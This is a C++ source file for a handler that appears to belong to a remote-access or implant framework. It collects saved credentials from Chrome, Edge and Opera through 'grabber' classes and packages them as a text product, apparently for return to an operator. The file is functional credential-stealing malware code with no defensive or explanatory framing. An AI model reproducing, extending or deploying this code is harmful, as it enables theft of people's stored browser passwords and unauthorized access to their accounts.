#include "GetAllCredentialsHandler.hpp"

#include "Trace.hpp"
#include "../Grabbers/ChromeCredentialsGrabber.hpp"
#include "../Grabbers/EdgeCredentialsGrabber.hpp"
#include "../Grabbers/OperaCredentialsGrabber.hpp"
#include "Products/TextTypedProduct.hpp"
#include "Utils/Strings.hpp"

GetAllCredentialsHandler::GetAllCredentialsHandler(std::unique_ptr<Event> operation_event):
	IOperationHandler(std::move(operation_event))
{
}

std::wstring GetAllCredentialsHandler::format_source(const std::wstring& source)
{
	return std::wstring{L"[Credentials "} + source + L"]";
}

std::wstring GetAllCredentialsHandler::format_credential(const Credential& credential)
{
	return Strings::concat(std::wstring(L"#Credential"), std::wstring(L"\n"), credential.serialize());
}

void GetAllCredentialsHandler::run()
{
	static constexpr auto SUFFIX = L"\n";
	std::wstring product;

	for (const auto& grabber : make_grabbers())
	{
		std::optional<Credentials> credentials = std::nullopt;
		try
		{
			credentials = grabber->grab_credentials();
		}
		CATCH_AND_TRACE();

		product.append(format_source(grabber->source()) + SUFFIX);

		if (credentials.has_value())
		{
			for (const Credential& credential : *credentials) {
				product.append(format_credential(credential) + SUFFIX);
			}
		}
		else
		{
			product.append(std::wstring{L"#Not Supported"} + SUFFIX);
		}

		product.append(SUFFIX);
	}
	append(std::make_unique<TextTypedProduct>(product));
	finished();
}

std::vector<CredentialsGrabber::Ptr> GetAllCredentialsHandler::make_grabbers()
{
	std::vector<CredentialsGrabber::Ptr> result;

	result.push_back(std::make_unique<ChromeCredentialsGrabber>());
	result.push_back(std::make_unique<EdgeCredentialsGrabber>());
	result.push_back(std::make_unique<OperaCredentialsGrabber>());

	return result;
}
